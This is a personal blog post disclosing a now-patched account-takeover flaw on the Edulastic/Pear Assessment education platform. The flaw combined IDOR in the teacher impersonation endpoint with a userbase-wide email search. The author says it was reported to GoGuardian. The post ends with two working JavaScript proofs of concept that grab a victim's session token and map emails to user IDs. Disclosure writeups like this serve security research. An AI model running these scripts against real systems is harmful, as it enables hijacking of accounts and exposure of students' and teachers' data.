+++
title = 'Full Account Takeover Vulnerability - Edulastic'
date = 2025-03-04T16:00:12Z
draft = false
+++

# Full Account Takeover Vulnerability on Pear Assessment/Edulastic

This is my first time writing a public writeup for something I've found in the wild, but apparently I found it too late as someone reported it before I did. I still decided to make this today, because I found out that the vulnerability was patched a little while ago. This vulnerability I found a while back allowed complete compromise of all user accounts on Edulastic, including administrators.

Edulastic/Pear Assessment is a testing and general work EdTech platform (owned by GoGuardian as part of the Peardeck Fleet), to easily make tests and take them (as a student). Key features include classroom management, 

## TL;DR

The impersonation feature available to teachers, meant for teachers of a class to be able to impersonate their students, was able to impersonate anyone. All that was needed was a user ID- I also figured out how to convert an email to a user ID, allowing account takeover with just an email. Teacher accounts can be created extremely easily; they do not need to be verified whatsoever. There are no restrictions on what accounts can be taken over, meaning all users on the platform were completely vulnerable to having their account stolen.

## How This Began

The requests that Edulastic/Pear Assessment makes are mostly vulnerable to IDOR (Insecure Direct Object Reference). Essentially, I can swap out identifying IDs in requests with other IDs, and in most cases, the server should return a 403 (forbidden) as this can lead to attackers being able to access more data than they should be able to. However, this simply wasn't the case for Edulastic, and its API is very reliant on IDs.

I made a teacher account, enrolled it to a neighboring school in my district, and created some fake student accounts to put in a class. I immediately realized that many of the requests it makes are dependent on IDs, and some responses contain information such as user ID. I replayed some requests which worked as expected, and soon, I replayed some with IDs that weren't associated with me; they worked. Of course, some important requests, such as deleting an account, returned 403s when you try to use IDOR on the requests. But a dangerous amount of requests were still very susceptible to IDOR.

## Some Important Information

1. Creating a teacher account takes around 30 seconds.
2. In my opinion, an account with the teacher role is very permissive, especially for how fast you can make one with no verification whatsoever.
3. Teachers have a button to impersonate students within their class.
4. Authentication is based on JSON web tokens (JWTs), and to authenticate a request under one's account, you just need their JWT. An account's JWT is about as important as a password, as it allows someone to log in.
5. There are scripts that are public already that allow you to log in as someone else with their JWT; of course, this is intended behavior.

## Actual Exploit

I discovered the impersonation button on my fake teacher account, and saw that the request it sent appended two things: a group ID (class ID), and a user/target ID. The response was a JWT- using a script, I could use that JWT as my own authentication token. Anyways, I then created a new random student account (NOT associated to the teacher account's class, district, or anything really), found and stored it's user ID, and then replayed the impersonation request. Didn't expect it to work, like the delete account request. However, something extremely suprising happened; it worked! Then, I realized something: the group/class ID doesn't even matter for the payload. So then, I created a different TEACHER account; I thought that this impersonation thing would only work for students, but no. I could take over teacher accounts (and as I later saw, administrator accounts, so it's safe to say I can take over literally any account).

This was a huge find since all the requirements were to take over an account was the victim's user ID and a burner teacher account on Edulastic. It's incredibly easy to find someone's user ID, for example your teacher: their ID could be found if you've EVER enrolled in one of their classes. From there, you could take over their account, steal and delete tests, and do things that were restricted before, such as deleting accounts and stealing data. 

## Email -> User ID

As I said before, the exploit could take over someone's account with just their *email;* sometimes, you aren't associated with the victim, but still want to take over their account. How do you do this? Through converting an email to a user ID.

I found that there's an endpoint intended to find teachers in YOUR district; you give an email, and you get a little bit of user data in return (just basic stuff like names) and their user ID. Okay, but what if you wanted the ID of someone who WASN'T in your district? The filter that ensures that you only find teachers in your district wasn't necessarily client side. You could specifify the types of accounts to find when replaying the request yourself (so this can extend the search to students and administrators), but you can't necessary extend the search to people outside of your district. Or can you?

## Email Search for Entire Userbase

The server filters requests based on what district you enrolled to, obviously. So, what if you replay that request right after making an account and accepting the TOS but BEFORE you choose a district to enroll to? So I did that- I copied the search request, replaced the authorization token with the brand new account that wasn't enrolled to any particular district, and as expected, it worked. You could specify some part of the email, like the domain or even just the TLD (big issue since you can dump a bunch of valid emails and names!), but the big thing is that there is no filter anymore. Your search applies to the entire userbase, meaning you can associate a user ID with an email now.

With this, the exploit is complete. All you need is a burner teacher account and the email or user ID of the victim.

## Reporting

I decided to report this one, and this is my first writeup because this is also my first report. I worked with GoGuardian (owner of Edulastic/Pear Deck fleet) and provided them the info they wanted. This information wasn't available publicly until now, because it's patched now.

However, it seems that someone reported this vulnerablity before me, so I wasn't eligble for a reward or anything, but it's still very cool cus this was my first report.

## Video demonstration

I use the below scripts here. A lot is redacted because it does have some PII. In the video, I take over an account using just the victim's email; the victim was the GoGuardian staff's account so I could demonstrate the vulnerability.

NOTE: I was too lazy to redact the information within the video, if I end up wanting to add the full redacted video then I'll do it, but for now I'll just have a cropped GIF

![takeover_gif](https://i.postimg.cc/WbQVtCn1/discloze-1.gif)

Here's a video of the global email lookup script being used:

![lookup_gif](https://i.postimg.cc/TwWF8Yzj/discloze-2.gif)

## POCs/Scripts

I've tested the account takeover PoC and it was patched, I think they patched the global email search thing but I don't know and I haven't tested it. I'm putting the PoC scripts for the account takeover vulnerability. This is only for informative purposes, not to help anyone try to abuse the service.

Account takeover:
  
```js
(async function() {

    let INPUT_VICTIMID = "input teacher/victim ID here"
    let INPUT_GROUPID = "input group ID here" // this can really be any id since the API doesn't care about this, you can even put the victim's ID here
    let INPUT_AUTH = "input attacker's burner teacher auth JWT token here"


          let response = await fetch(`https://assessment.peardeck.com/api/user/proxy?userId=${INPUT_VICTIMID}&groupId=${INPUT_GROUPID}`, {
        "headers": {
          "accept": "application/json, text/plain, */*",
          "authorization": INPUT_AUTH
        },
        "method": "GET"
      })

          let token = await response.json()
      token = token.result.token

    if (token) {
        console.log(token)
        alert("Grabbed token successfully!");
        localStorage.clear();
        sessionStorage.clear();

        let userresp = await fetch("https://assessment.peardeck.com/api/user/me", {
          "headers": {
            "accept": "application/json, text/plain, */*",
            "authorization": token
          },
          "method": "GET"
        })

        userresp = await userresp.json()
        userresp = userresp.result

        var new_key = `user:${userresp._id}:role:${userresp.role}`;
        localStorage.setItem("tokens", `["${new_key}"]`);
        localStorage.setItem(new_key, token);
        sessionStorage.setItem("tokenKey", new_key);

        window.location.href = "https://assessment.peardeck.com/";
      }
})()
```

Global email search (as I said before, this only worked BEFORE choosing a district to enroll to):

```js
var userEmailString = ""; // email of victim

fetch("https://app.edulastic.com/api/user/search", {
  headers: {
    "accept": "application/json, text/plain, */*",
    "authorization": localStorage[JSON.parse(localStorage.tokens)[0]],
    "content-type": "application/json"
  },
  body: JSON.stringify({
    limit: 50,
    page: 1,
    type: "INDIVIDUAL",
    search: {
      role: ["teacher"],
      searchString: userEmailString,
      status: 1
    }
  }),
  method: "POST"
})
  .then(response => response.json())
  .then(data => {
    if (data.result && data.result.data && data.result.data.length > 0) {
      data.result.data.forEach(user => {
        const firstName = user._source.firstName || "Unknown";
        const lastName = user._source.lastName || "Unknown";
        const userId = user._id || "Unknown ID";
        console.log(`Found user ID for ${firstName} ${lastName}: ${userId}`);
      });
    } else {
      console.log("No users found for the given email.");
    }
  })
  .catch(error => console.error("Error:", error));
```

## End 

It was cool reporting this

- doxr